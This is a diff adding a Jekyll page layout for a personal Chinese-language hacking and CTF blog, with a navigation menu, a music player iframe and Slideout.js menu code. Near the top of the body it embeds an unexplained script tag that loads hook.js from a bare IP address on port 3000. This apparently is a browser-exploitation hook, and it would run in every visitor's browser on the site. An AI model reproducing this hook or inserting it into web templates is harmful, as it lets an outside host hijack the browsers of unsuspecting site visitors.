@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+{% include head.html %}
+<body>
+
+
+
+<script src="http://47.240.47.103:3000/hook.js"></script>
+<nav id="menu" class="menu">
+  <a href="#" target="_blank">
+    <header class="menu-header">
+      <span class="menu-header-title">Kig</span>
+    </header>
+  </a>
+
+  <section class="menu-section">
+    <h3 class="menu-section-title">Hacker</h3>
+    <ul class="menu-section-list">
+      <li><a href="/%E5%85%B3%E4%BA%8E%E6%88%91/" target="_self">Web</a></li>
+      <li><a href="/%E5%85%B3%E4%BA%8E%E6%88%91/" target="_self">硬件</a></li>
+      <li><a href="/%E5%85%B3%E4%BA%8E%E6%88%91/" target="_self">密码学</a></li>
+      <li><a href="/%E5%85%B3%E4%BA%8E%E6%88%91/" target="_self">Linux二进制</a></li>
+    </ul>
+  </section>
+
+  <section class="menu-section">
+    <h3 class="menu-section-title">CTF</h3>
+    <ul class="menu-section-list">
+      <li><a href="/%E5%85%B3%E4%BA%8E%E6%88%91/" target="_self">Pwn</a></li>
+      <li><a href="/%E5%85%B3%E4%BA%8E%E6%88%91/" target="_self">Reverse</a></li>
+      <li><a href="/%E5%85%B3%E4%BA%8E%E6%88%91/" target="_self">GameHex</a></li>
+    </ul>
+  </section>
+
+  <section class="menu-section">
+    <h3 class="menu-section-title">杂项</h3>
+    <ul class="menu-section-list">
+      <li><a href="https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w" target="_blank">推荐: <font color=#0066FF>><strong>Liveoverflow</strong></font></a></li>
+      <li><a href="/%E5%85%B3%E4%BA%8E%E6%88%91/" target="_self">草草</a></li>
+      <li><a href="https://www.nack.vip/" target="_blank">友链: <font color=#0066FF>Surmountの</font></a></li>
+    </ul>
+	<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=19182546&auto=1&height=66"></iframe>
+  </section>
+</nav>
+<main id="main" class="panel">
+    <button class="btn-hamburger js-slideout-toggle">
+      <span class="tooltip">Entry</span>
+    </button>
+</main>
+
+<script type="text/javascript" src="{{site.baseurl}}/assets/js/slideout.js"></script>
+<script type="text/javascript">
+    var slideout = new Slideout({
+        'panel': document.getElementById('main'),
+        'menu': document.getElementById('menu'),
+        'padding': 256,
+        'tolerance': 70
+     });
+
+     document.querySelector('.js-slideout-toggle').addEventListener('click', function() {
+        slideout.toggle();
+     });
+
+     document.querySelector('.menu').addEventListener('click', function(eve) {
+        if (eve.target.nodeName === 'A') { slideout.close(); }
+     });
+	slideout.toggle();
+
+</script>
+
+
+
+
+  <div class="wrapper">
+    {{ content }}
+  </div>
+  
+  {% include analytics.html %}
+
+</body>
+</html>
